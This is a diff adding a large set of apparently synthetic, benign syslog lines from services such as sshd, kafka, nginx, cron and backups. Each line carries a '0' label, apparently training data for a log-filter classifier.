+Mar  5 00:24:36 web02 kafka[43624]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr  6 01:31:49 auth01 kafka[43661]: Group logfilter-router stable with 1 members generation 1154,0
+May  7 02:38:02 vpn01 elasticsearch[43698]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun  8 03:45:15 db01 elasticsearch[43735]: rollover index raw-logs-000012 completed successfully,0
+Jul  9 04:52:28 app01 redis[43772]: Background saving terminated with success,0
+Aug 10 05:59:41 mail01 redis[43809]: Accepted connection from 172.16.0.27:6379,0
+Sep 11 06:06:54 proxy01 sudo[43846]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct 12 07:13:07 worker01 sudo[43883]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
+Jan 13 08:20:20 edge-fw01 auditd[43920]: SERVICE_START pid=1 uid=0 auid=4294967295 msg=unit=cron comm=systemd,0
+Feb 14 09:27:33 web01 auditd[43957]: USER_LOGIN pid=1021 uid=0 auid=1000 msg=op=login id=1000 exe=/usr/sbin/sshd hostname=192.168.2.211 res=success,0
+Mar 15 10:34:46 web02 NetworkManager[43994]: device (eth0): state change: activated -> deactivating (reason user-requested),0
+Apr 16 11:41:59 auth01 NetworkManager[44031]: device (eth0): state change: config -> ip-check (reason none),0
+May 17 12:48:12 vpn01 dhclient[44068]: DHCPACK of 192.168.2.214 from 192.168.1.1,0
+Jun 18 13:55:25 db01 systemd-timesyncd[44105]: Synchronized to time server 162.159.200.123:123 (time.cloudflare.com).,0
+Jul 19 14:02:38 app01 chronyd[44142]: Selected source 169.254.169.123,0
+Aug 20 15:09:51 mail01 mail[44179]: postfix/qmgr[1542]: queued as 9A12B3C4D5 to=<ops@example.com> relay=local,0
+Sep 21 16:16:04 proxy01 postfix/smtp[44216]: status=sent (250 2.0.0 Ok: queued as 12345),0
+Oct 22 17:23:17 worker01 ufw[44253]: ALLOW OUT eth0 SRC=192.168.2.219 DST=8.8.8.8 LEN=76 PROTO=UDP SPT=5353 DPT=53,0
+Jan 23 18:30:30 edge-fw01 iptables[44290]: ACCEPT INPUT IN=eth0 OUT= MAC=00:11:22 SRC=192.168.2.220 DST=172.16.0.40 PROTO=TCP SPT=443 DPT=54822,0
+Feb 24 19:37:43 web01 prometheus[44327]: Scrape of target logfilter-api:8080 completed in 18ms status=200,0
+Mar 25 20:44:56 web02 grafana[44364]: Request Completed method=GET path=/api/health status=200 remote_addr=192.168.2.222,0
+Apr 26 21:51:09 auth01 backup[44401]: nightly backup completed successfully files=12890 bytes=987654321 duration=420s,0
+May 27 22:58:22 vpn01 backup[44438]: snapshot created repository=prod-snapshots snapshot=logs-1175 state=SUCCESS,0
+Jun 28 23:05:35 db01 clamav[44475]: SelfCheck: Database status OK.,0
+Jul  1 00:12:48 app01 clamav[44512]: Database correctly reloaded (9234567 signatures),0
+Aug  2 01:19:01 mail01 cupsd[44549]: Successful-Ok request from localhost for printer office-laser,0
+Sep  3 02:26:14 proxy01 systemd[44586]: Started Cleanup of Temporary Directories.,0
+Oct  4 03:33:27 worker01 systemd[44623]: Finished Daily apt download activities.,0
+Jan  5 04:40:40 edge-fw01 sshd[44660]: Accepted password for user1 from 192.168.2.230 port 22 ssh2,0
+Feb  6 05:47:53 web01 sshd[44697]: Accepted publickey for deploy from 192.168.2.231 port 43337 ssh2: RSA SHA256:OK,0
+Mar  7 06:54:06 web02 sshd[44734]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr  8 07:01:19 auth01 sshd[44771]: pam_unix(sshd:session): session closed for user backup,0
+May  9 08:08:32 vpn01 systemd[44808]: Started Session 1185 of user appsvc.,0
+Jun 10 09:15:45 db01 systemd[44845]: Stopped target Multi-User System.,0
+Jul 11 10:22:58 app01 systemd[44882]: Reached target Network is Online.,0
+Aug 12 11:29:11 mail01 systemd[44919]: Started OpenSSH Daemon.,0
+Sep 13 12:36:24 proxy01 systemd[44956]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct 14 13:43:37 worker01 kernel[44993]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan 15 14:50:50 edge-fw01 kernel[45030]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb 16 15:57:03 web01 kernel[45067]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar 17 16:04:16 web02 cron[45104]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr 18 17:11:29 auth01 cron[45141]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May 19 18:18:42 vpn01 CRON[45178]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun 20 19:25:55 db01 CRON[45215]: pam_unix(cron:session): session closed for user root,0
+Jul 21 20:32:08 app01 logrotate[45252]: rotated /var/log/nginx/access.log successfully,0
+Aug 22 21:39:21 mail01 rsyslogd[45289]: action action-0-builtin:omfile resumed,0
+"Sep 23 22:46:34 proxy01 smartd[45326]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct 24 23:53:47 worker01 node_exporter[45363]: disk space report filesystem=/var used=42% available=58%,0
+Jan 25 00:00:00 edge-fw01 df-monitor[45400]: disk space OK mount=/home used=37% available=63%,0
+Feb 26 01:07:13 web01 postgres[45437]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar 27 02:14:26 web02 postgres[45474]: connection authorized: user=app database=logs application_name=api,0
+Apr 28 03:21:39 auth01 nginx[45511]: GET /health HTTP/1.1 from 192.168.0.13 returned 200 bytes=32,0
+May  1 04:28:52 vpn01 nginx[45548]: GET /index.html HTTP/1.1 from 172.16.1.74 returned 200 bytes=4380,0
+Jun  2 05:35:05 db01 nginx[45585]: POST /api/v1/events HTTP/1.1 from 192.168.0.15 returned 201 bytes=118,0
+Jul  3 06:42:18 app01 apache2[45622]: GET /static/app.css HTTP/1.1 from 172.16.1.76 returned 304 bytes=0,0
+Aug  4 07:49:31 mail01 apache2[45659]: GET /favicon.ico HTTP/1.1 from 192.168.0.17 returned 200 bytes=5430,0
+"Sep  5 08:56:44 proxy01 haproxy[45696]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct  6 09:03:57 worker01 haproxy[45733]: Connect from 192.168.0.19:53210 to 172.16.1.79:443 frontend https-in,0
+Jan  7 10:10:10 edge-fw01 docker[45770]: Container logfilter-api restarted successfully with exit code 0,0
+Feb  8 11:17:23 web01 containerd[45807]: StartContainer for container web completed successfully,0
+Mar  9 12:24:36 web02 kafka[45844]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr 10 13:31:49 auth01 kafka[45881]: Group logfilter-router stable with 1 members generation 1214,0
+May 11 14:38:02 vpn01 elasticsearch[45918]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun 12 15:45:15 db01 elasticsearch[45955]: rollover index raw-logs-000012 completed successfully,0
+Jul 13 16:52:28 app01 redis[45992]: Background saving terminated with success,0
+Aug 14 17:59:41 mail01 redis[46029]: Accepted connection from 172.16.1.87:6379,0
+Sep 15 18:06:54 proxy01 sudo[46066]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct 16 19:13:07 worker01 sudo[46103]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
+Jan 17 20:20:20 edge-fw01 auditd[46140]: SERVICE_START pid=1 uid=0 auid=4294967295 msg=unit=cron comm=systemd,0
+Feb 18 21:27:33 web01 auditd[46177]: USER_LOGIN pid=1021 uid=0 auid=1000 msg=op=login id=1000 exe=/usr/sbin/sshd hostname=192.168.0.31 res=success,0
+Mar 19 22:34:46 web02 NetworkManager[46214]: device (eth0): state change: activated -> deactivating (reason user-requested),0
+Apr 20 23:41:59 auth01 NetworkManager[46251]: device (eth0): state change: config -> ip-check (reason none),0
+May 21 00:48:12 vpn01 dhclient[46288]: DHCPACK of 192.168.0.34 from 192.168.1.1,0
+Jun 22 01:55:25 db01 systemd-timesyncd[46325]: Synchronized to time server 162.159.200.123:123 (time.cloudflare.com).,0
+Jul 23 02:02:38 app01 chronyd[46362]: Selected source 169.254.169.123,0
+Aug 24 03:09:51 mail01 mail[46399]: postfix/qmgr[1542]: queued as 9A12B3C4D5 to=<ops@example.com> relay=local,0
+Sep 25 04:16:04 proxy01 postfix/smtp[46436]: status=sent (250 2.0.0 Ok: queued as 12345),0
+Oct 26 05:23:17 worker01 ufw[46473]: ALLOW OUT eth0 SRC=192.168.0.39 DST=8.8.8.8 LEN=76 PROTO=UDP SPT=5353 DPT=53,0
+Jan 27 06:30:30 edge-fw01 iptables[46510]: ACCEPT INPUT IN=eth0 OUT= MAC=00:11:22 SRC=192.168.0.40 DST=172.16.1.100 PROTO=TCP SPT=443 DPT=54822,0
+Feb 28 07:37:43 web01 prometheus[46547]: Scrape of target logfilter-api:8080 completed in 18ms status=200,0
+Mar  1 08:44:56 web02 grafana[46584]: Request Completed method=GET path=/api/health status=200 remote_addr=192.168.0.42,0
+Apr  2 09:51:09 auth01 backup[46621]: nightly backup completed successfully files=12890 bytes=987654321 duration=420s,0
+May  3 10:58:22 vpn01 backup[46658]: snapshot created repository=prod-snapshots snapshot=logs-1235 state=SUCCESS,0
+Jun  4 11:05:35 db01 clamav[46695]: SelfCheck: Database status OK.,0
+Jul  5 12:12:48 app01 clamav[46732]: Database correctly reloaded (9234567 signatures),0
+Aug  6 13:19:01 mail01 cupsd[46769]: Successful-Ok request from localhost for printer office-laser,0
+Sep  7 14:26:14 proxy01 systemd[46806]: Started Cleanup of Temporary Directories.,0
+Oct  8 15:33:27 worker01 systemd[46843]: Finished Daily apt download activities.,0
+Jan  9 16:40:40 edge-fw01 sshd[46880]: Accepted password for user1 from 192.168.0.50 port 22 ssh2,0
+Feb 10 17:47:53 web01 sshd[46917]: Accepted publickey for deploy from 192.168.0.51 port 53717 ssh2: RSA SHA256:OK,0
+Mar 11 18:54:06 web02 sshd[46954]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr 12 19:01:19 auth01 sshd[46991]: pam_unix(sshd:session): session closed for user backup,0
+May 13 20:08:32 vpn01 systemd[47028]: Started Session 1245 of user appsvc.,0
+Jun 14 21:15:45 db01 systemd[47065]: Stopped target Multi-User System.,0
+Jul 15 22:22:58 app01 systemd[47102]: Reached target Network is Online.,0
+Aug 16 23:29:11 mail01 systemd[47139]: Started OpenSSH Daemon.,0
+Sep 17 00:36:24 proxy01 systemd[47176]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct 18 01:43:37 worker01 kernel[47213]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan 19 02:50:50 edge-fw01 kernel[47250]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb 20 03:57:03 web01 kernel[47287]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar 21 04:04:16 web02 cron[47324]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr 22 05:11:29 auth01 cron[47361]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May 23 06:18:42 vpn01 CRON[47398]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun 24 07:25:55 db01 CRON[47435]: pam_unix(cron:session): session closed for user root,0
+Jul 25 08:32:08 app01 logrotate[47472]: rotated /var/log/nginx/access.log successfully,0
+Aug 26 09:39:21 mail01 rsyslogd[47509]: action action-0-builtin:omfile resumed,0
+"Sep 27 10:46:34 proxy01 smartd[47546]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct 28 11:53:47 worker01 node_exporter[47583]: disk space report filesystem=/var used=42% available=58%,0
+Jan  1 12:00:00 edge-fw01 df-monitor[47620]: disk space OK mount=/home used=37% available=63%,0
+Feb  2 13:07:13 web01 postgres[47657]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar  3 14:14:26 web02 postgres[47694]: connection authorized: user=app database=logs application_name=api,0
+Apr  4 15:21:39 auth01 nginx[47731]: GET /health HTTP/1.1 from 192.168.0.73 returned 200 bytes=32,0
+May  5 16:28:52 vpn01 nginx[47768]: GET /index.html HTTP/1.1 from 172.16.1.134 returned 200 bytes=4380,0
+Jun  6 17:35:05 db01 nginx[47805]: POST /api/v1/events HTTP/1.1 from 192.168.0.75 returned 201 bytes=118,0
+Jul  7 18:42:18 app01 apache2[47842]: GET /static/app.css HTTP/1.1 from 172.16.1.136 returned 304 bytes=0,0
+Aug  8 19:49:31 mail01 apache2[47879]: GET /favicon.ico HTTP/1.1 from 192.168.0.77 returned 200 bytes=5430,0
+"Sep  9 20:56:44 proxy01 haproxy[47916]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct 10 21:03:57 worker01 haproxy[47953]: Connect from 192.168.0.79:53210 to 172.16.1.139:443 frontend https-in,0
+Jan 11 22:10:10 edge-fw01 docker[47990]: Container logfilter-api restarted successfully with exit code 0,0
+Feb 12 23:17:23 web01 containerd[48027]: StartContainer for container web completed successfully,0
+Mar 13 00:24:36 web02 kafka[48064]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr 14 01:31:49 auth01 kafka[48101]: Group logfilter-router stable with 1 members generation 1274,0
+May 15 02:38:02 vpn01 elasticsearch[48138]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun 16 03:45:15 db01 elasticsearch[48175]: rollover index raw-logs-000012 completed successfully,0
+Jul 17 04:52:28 app01 redis[48212]: Background saving terminated with success,0
+Aug 18 05:59:41 mail01 redis[48249]: Accepted connection from 172.16.2.147:6379,0
+Sep 19 06:06:54 proxy01 sudo[48286]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct 20 07:13:07 worker01 sudo[48323]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
+Jan 21 08:20:20 edge-fw01 auditd[48360]: SERVICE_START pid=1 uid=0 auid=4294967295 msg=unit=cron comm=systemd,0
+Feb 22 09:27:33 web01 auditd[48397]: USER_LOGIN pid=1021 uid=0 auid=1000 msg=op=login id=1000 exe=/usr/sbin/sshd hostname=192.168.0.91 res=success,0
+Mar 23 10:34:46 web02 NetworkManager[48434]: device (eth0): state change: activated -> deactivating (reason user-requested),0
+Apr 24 11:41:59 auth01 NetworkManager[48471]: device (eth0): state change: config -> ip-check (reason none),0
+May 25 12:48:12 vpn01 dhclient[48508]: DHCPACK of 192.168.0.94 from 192.168.1.1,0
+Jun 26 13:55:25 db01 systemd-timesyncd[48545]: Synchronized to time server 162.159.200.123:123 (time.cloudflare.com).,0
+Jul 27 14:02:38 app01 chronyd[48582]: Selected source 169.254.169.123,0
+Aug 28 15:09:51 mail01 mail[48619]: postfix/qmgr[1542]: queued as 9A12B3C4D5 to=<ops@example.com> relay=local,0
+Sep  1 16:16:04 proxy01 postfix/smtp[48656]: status=sent (250 2.0.0 Ok: queued as 12345),0
+Oct  2 17:23:17 worker01 ufw[48693]: ALLOW OUT eth0 SRC=192.168.0.99 DST=8.8.8.8 LEN=76 PROTO=UDP SPT=5353 DPT=53,0
+Jan  3 18:30:30 edge-fw01 iptables[48730]: ACCEPT INPUT IN=eth0 OUT= MAC=00:11:22 SRC=192.168.0.100 DST=172.16.2.160 PROTO=TCP SPT=443 DPT=54822,0
+Feb  4 19:37:43 web01 prometheus[48767]: Scrape of target logfilter-api:8080 completed in 18ms status=200,0
+Mar  5 20:44:56 web02 grafana[48804]: Request Completed method=GET path=/api/health status=200 remote_addr=192.168.0.102,0
+Apr  6 21:51:09 auth01 backup[48841]: nightly backup completed successfully files=12890 bytes=987654321 duration=420s,0
+May  7 22:58:22 vpn01 backup[48878]: snapshot created repository=prod-snapshots snapshot=logs-1295 state=SUCCESS,0
+Jun  8 23:05:35 db01 clamav[48915]: SelfCheck: Database status OK.,0
+Jul  9 00:12:48 app01 clamav[48952]: Database correctly reloaded (9234567 signatures),0
+Aug 10 01:19:01 mail01 cupsd[48989]: Successful-Ok request from localhost for printer office-laser,0
+Sep 11 02:26:14 proxy01 systemd[49026]: Started Cleanup of Temporary Directories.,0
+Oct 12 03:33:27 worker01 systemd[49063]: Finished Daily apt download activities.,0
+Jan 13 04:40:40 edge-fw01 sshd[49100]: Accepted password for user1 from 192.168.1.110 port 22 ssh2,0
+Feb 14 05:47:53 web01 sshd[49137]: Accepted publickey for deploy from 192.168.1.111 port 10097 ssh2: RSA SHA256:OK,0
+Mar 15 06:54:06 web02 sshd[49174]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr 16 07:01:19 auth01 sshd[49211]: pam_unix(sshd:session): session closed for user backup,0
+May 17 08:08:32 vpn01 systemd[49248]: Started Session 1305 of user appsvc.,0
+Jun 18 09:15:45 db01 systemd[49285]: Stopped target Multi-User System.,0
+Jul 19 10:22:58 app01 systemd[49322]: Reached target Network is Online.,0
+Aug 20 11:29:11 mail01 systemd[49359]: Started OpenSSH Daemon.,0
+Sep 21 12:36:24 proxy01 systemd[49396]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct 22 13:43:37 worker01 kernel[49433]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan 23 14:50:50 edge-fw01 kernel[49470]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb 24 15:57:03 web01 kernel[49507]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar 25 16:04:16 web02 cron[49544]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr 26 17:11:29 auth01 cron[49581]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May 27 18:18:42 vpn01 CRON[49618]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun 28 19:25:55 db01 CRON[49655]: pam_unix(cron:session): session closed for user root,0
+Jul  1 20:32:08 app01 logrotate[49692]: rotated /var/log/nginx/access.log successfully,0
+Aug  2 21:39:21 mail01 rsyslogd[49729]: action action-0-builtin:omfile resumed,0
+"Sep  3 22:46:34 proxy01 smartd[49766]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct  4 23:53:47 worker01 node_exporter[49803]: disk space report filesystem=/var used=42% available=58%,0
+Jan  5 00:00:00 edge-fw01 df-monitor[49840]: disk space OK mount=/home used=37% available=63%,0
+Feb  6 01:07:13 web01 postgres[49877]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar  7 02:14:26 web02 postgres[49914]: connection authorized: user=app database=logs application_name=api,0
+Apr  8 03:21:39 auth01 nginx[49951]: GET /health HTTP/1.1 from 192.168.1.133 returned 200 bytes=32,0
+May  9 04:28:52 vpn01 nginx[49988]: GET /index.html HTTP/1.1 from 172.16.2.194 returned 200 bytes=4380,0
+Jun 10 05:35:05 db01 nginx[1025]: POST /api/v1/events HTTP/1.1 from 192.168.1.135 returned 201 bytes=118,0
+Jul 11 06:42:18 app01 apache2[1062]: GET /static/app.css HTTP/1.1 from 172.16.2.196 returned 304 bytes=0,0
+Aug 12 07:49:31 mail01 apache2[1099]: GET /favicon.ico HTTP/1.1 from 192.168.1.137 returned 200 bytes=5430,0
+"Sep 13 08:56:44 proxy01 haproxy[1136]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct 14 09:03:57 worker01 haproxy[1173]: Connect from 192.168.1.139:53210 to 172.16.2.199:443 frontend https-in,0
+Jan 15 10:10:10 edge-fw01 docker[1210]: Container logfilter-api restarted successfully with exit code 0,0
+Feb 16 11:17:23 web01 containerd[1247]: StartContainer for container web completed successfully,0
+Mar 17 12:24:36 web02 kafka[1284]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr 18 13:31:49 auth01 kafka[1321]: Group logfilter-router stable with 1 members generation 1334,0
+May 19 14:38:02 vpn01 elasticsearch[1358]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun 20 15:45:15 db01 elasticsearch[1395]: rollover index raw-logs-000012 completed successfully,0
+Jul 21 16:52:28 app01 redis[1432]: Background saving terminated with success,0
+Aug 22 17:59:41 mail01 redis[1469]: Accepted connection from 172.16.2.207:6379,0
+Sep 23 18:06:54 proxy01 sudo[1506]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct 24 19:13:07 worker01 sudo[1543]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
+Jan 25 20:20:20 edge-fw01 auditd[1580]: SERVICE_START pid=1 uid=0 auid=4294967295 msg=unit=cron comm=systemd,0
+Feb 26 21:27:33 web01 auditd[1617]: USER_LOGIN pid=1021 uid=0 auid=1000 msg=op=login id=1000 exe=/usr/sbin/sshd hostname=192.168.1.151 res=success,0
+Mar 27 22:34:46 web02 NetworkManager[1654]: device (eth0): state change: activated -> deactivating (reason user-requested),0
+Apr 28 23:41:59 auth01 NetworkManager[1691]: device (eth0): state change: config -> ip-check (reason none),0
+May  1 00:48:12 vpn01 dhclient[1728]: DHCPACK of 192.168.1.154 from 192.168.1.1,0
+Jun  2 01:55:25 db01 systemd-timesyncd[1765]: Synchronized to time server 162.159.200.123:123 (time.cloudflare.com).,0
+Jul  3 02:02:38 app01 chronyd[1802]: Selected source 169.254.169.123,0
+Aug  4 03:09:51 mail01 mail[1839]: postfix/qmgr[1542]: queued as 9A12B3C4D5 to=<ops@example.com> relay=local,0
+Sep  5 04:16:04 proxy01 postfix/smtp[1876]: status=sent (250 2.0.0 Ok: queued as 12345),0
+Oct  6 05:23:17 worker01 ufw[1913]: ALLOW OUT eth0 SRC=192.168.1.159 DST=8.8.8.8 LEN=76 PROTO=UDP SPT=5353 DPT=53,0
+Jan  7 06:30:30 edge-fw01 iptables[1950]: ACCEPT INPUT IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.160 DST=172.16.3.220 PROTO=TCP SPT=443 DPT=54822,0
+Feb  8 07:37:43 web01 prometheus[1987]: Scrape of target logfilter-api:8080 completed in 18ms status=200,0
+Mar  9 08:44:56 web02 grafana[2024]: Request Completed method=GET path=/api/health status=200 remote_addr=192.168.1.162,0
+Apr 10 09:51:09 auth01 backup[2061]: nightly backup completed successfully files=12890 bytes=987654321 duration=420s,0
+May 11 10:58:22 vpn01 backup[2098]: snapshot created repository=prod-snapshots snapshot=logs-1355 state=SUCCESS,0
+Jun 12 11:05:35 db01 clamav[2135]: SelfCheck: Database status OK.,0
+Jul 13 12:12:48 app01 clamav[2172]: Database correctly reloaded (9234567 signatures),0
+Aug 14 13:19:01 mail01 cupsd[2209]: Successful-Ok request from localhost for printer office-laser,0
+Sep 15 14:26:14 proxy01 systemd[2246]: Started Cleanup of Temporary Directories.,0
+Oct 16 15:33:27 worker01 systemd[2283]: Finished Daily apt download activities.,0
+Jan 17 16:40:40 edge-fw01 sshd[2320]: Accepted password for user1 from 192.168.1.170 port 22 ssh2,0
+Feb 18 17:47:53 web01 sshd[2357]: Accepted publickey for deploy from 192.168.1.171 port 20477 ssh2: RSA SHA256:OK,0
+Mar 19 18:54:06 web02 sshd[2394]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr 20 19:01:19 auth01 sshd[2431]: pam_unix(sshd:session): session closed for user backup,0
+May 21 20:08:32 vpn01 systemd[2468]: Started Session 1365 of user appsvc.,0
+Jun 22 21:15:45 db01 systemd[2505]: Stopped target Multi-User System.,0
+Jul 23 22:22:58 app01 systemd[2542]: Reached target Network is Online.,0
+Aug 24 23:29:11 mail01 systemd[2579]: Started OpenSSH Daemon.,0
+Sep 25 00:36:24 proxy01 systemd[2616]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct 26 01:43:37 worker01 kernel[2653]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan 27 02:50:50 edge-fw01 kernel[2690]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb 28 03:57:03 web01 kernel[2727]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar  1 04:04:16 web02 cron[2764]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr  2 05:11:29 auth01 cron[2801]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May  3 06:18:42 vpn01 CRON[2838]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun  4 07:25:55 db01 CRON[2875]: pam_unix(cron:session): session closed for user root,0
+Jul  5 08:32:08 app01 logrotate[2912]: rotated /var/log/nginx/access.log successfully,0
+Aug  6 09:39:21 mail01 rsyslogd[2949]: action action-0-builtin:omfile resumed,0
+"Sep  7 10:46:34 proxy01 smartd[2986]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct  8 11:53:47 worker01 node_exporter[3023]: disk space report filesystem=/var used=42% available=58%,0
+Jan  9 12:00:00 edge-fw01 df-monitor[3060]: disk space OK mount=/home used=37% available=63%,0
+Feb 10 13:07:13 web01 postgres[3097]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar 11 14:14:26 web02 postgres[3134]: connection authorized: user=app database=logs application_name=api,0
+Apr 12 15:21:39 auth01 nginx[3171]: GET /health HTTP/1.1 from 192.168.1.193 returned 200 bytes=32,0
+May 13 16:28:52 vpn01 nginx[3208]: GET /index.html HTTP/1.1 from 172.16.3.24 returned 200 bytes=4380,0
+Jun 14 17:35:05 db01 nginx[3245]: POST /api/v1/events HTTP/1.1 from 192.168.1.195 returned 201 bytes=118,0
+Jul 15 18:42:18 app01 apache2[3282]: GET /static/app.css HTTP/1.1 from 172.16.3.26 returned 304 bytes=0,0
+Aug 16 19:49:31 mail01 apache2[3319]: GET /favicon.ico HTTP/1.1 from 192.168.1.197 returned 200 bytes=5430,0
+"Sep 17 20:56:44 proxy01 haproxy[3356]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct 18 21:03:57 worker01 haproxy[3393]: Connect from 192.168.1.199:53210 to 172.16.3.29:443 frontend https-in,0
+Jan 19 22:10:10 edge-fw01 docker[3430]: Container logfilter-api restarted successfully with exit code 0,0
+Feb 20 23:17:23 web01 containerd[3467]: StartContainer for container web completed successfully,0
+Mar 21 00:24:36 web02 kafka[3504]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr 22 01:31:49 auth01 kafka[3541]: Group logfilter-router stable with 1 members generation 1394,0
+May 23 02:38:02 vpn01 elasticsearch[3578]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun 24 03:45:15 db01 elasticsearch[3615]: rollover index raw-logs-000012 completed successfully,0
+Jul 25 04:52:28 app01 redis[3652]: Background saving terminated with success,0
+Aug 26 05:59:41 mail01 redis[3689]: Accepted connection from 172.16.3.37:6379,0
+Sep 27 06:06:54 proxy01 sudo[3726]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct 28 07:13:07 worker01 sudo[3763]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
